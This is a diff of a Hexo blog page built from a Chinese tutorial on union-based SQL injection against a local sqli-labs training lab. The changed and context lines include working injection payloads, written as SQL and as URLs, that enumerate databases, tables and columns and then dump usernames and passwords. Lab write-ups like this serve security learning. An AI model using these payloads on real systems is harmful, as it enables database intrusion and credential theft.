@@ -14,7 +14,11 @@
     <meta name="screen-orientation" content="portrait">
     <link rel="dns-prefetch" href="http://tea9.xyz">
   	<link rel="stylesheet" href="/css/style.css">
-  	<link rel="stylesheet" href="/css/github-gist.css">
+    <link rel="stylesheet" href="/css/github-gist.css">
+    
+      <link rel="stylesheet" href="/css/prettify.css">
+      <link rel="stylesheet" href="/css/highlight/atelier-savanna-light.min.css">
+    
     <!--SEO-->
 
 <meta name="description" content="心中有光の孩子"/>
@@ -134,24 +138,24 @@ select * from users where id=-1 union select 1,(select version()),3;
 
 3. select * from users where id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata);
 
-4. select * from users where id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;); // 当前库可以换成database() &apos;&apos;不识别可以换成十六进制0x
+4. select * from users where id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;); // 当前库可以换成database() &#39;&#39;不识别可以换成十六进制0x
 
-5. select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;);
+5. select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;);
 
 6. select * from users where id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users);
 </code></pre><p>浏览器访问：<br><a href="http://127.0.0.1:90/Less-1/" target="_blank" rel="noopener">http://127.0.0.1:90/Less-1/</a>  </p>
-<pre><code>http://127.0.0.1:90/Less-1/?id=1&apos;
-http://127.0.0.1:90/Less-1/?id=1&apos; order by 1 --+ // 二分法试
-http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,3 --+
-http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,(version())--+ // user() database()
+<pre><code>http://127.0.0.1:90/Less-1/?id=1&#39;
+http://127.0.0.1:90/Less-1/?id=1&#39; order by 1 --+ // 二分法试
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,3 --+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(version())--+ // user() database()
 
-http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+
 
-http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)--+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+
 
-http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)--+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+
 
-http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
 </code></pre> 
 		</div>
 		
@@ -171,24 +175,34 @@ http://127.0.0.1:90/Less-1/?id=-1&apos; union select 1,2,(select group_concat(us
 
 		<hr />
 <div class="footer">
-	
-        
-            <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
-		    	<i class="iconfont">&#xeee2;</i>
-		    </a>&nbsp;&nbsp;
-        
-            <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
-		    	<i class="iconfont">&#xe6ee;</i>
-		    </a>&nbsp;&nbsp;
-        
-	
+   
+    
+      <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
+        <i class="iconfont">&#xeee2;</i> 
+      </a>
+      &nbsp;&nbsp; 
+    
+      <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
+        <i class="iconfont">&#xe6ee;</i> 
+      </a>
+      &nbsp;&nbsp; 
+     
+  
 </div>
 <script src="/js/jquery.min.js"></script>
-<script src="/js/highlight.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
+ <script src="/js/prettify.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("pre").addClass(
+      "prettyprint linenums"
+    );
+    prettyPrint();
+  });
+</script>
+
 
 		<div class="copyright">
-	Copyright &copy; 2019 . 没有备案<br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Hosted by <a href="https://pages.coding.me">Coding Pages</a>
+	Copyright &copy; 2019 . <a href="/v1">v1</a> . <a href="/v2">v2</a><br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>
 </div>
   <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
 </html>
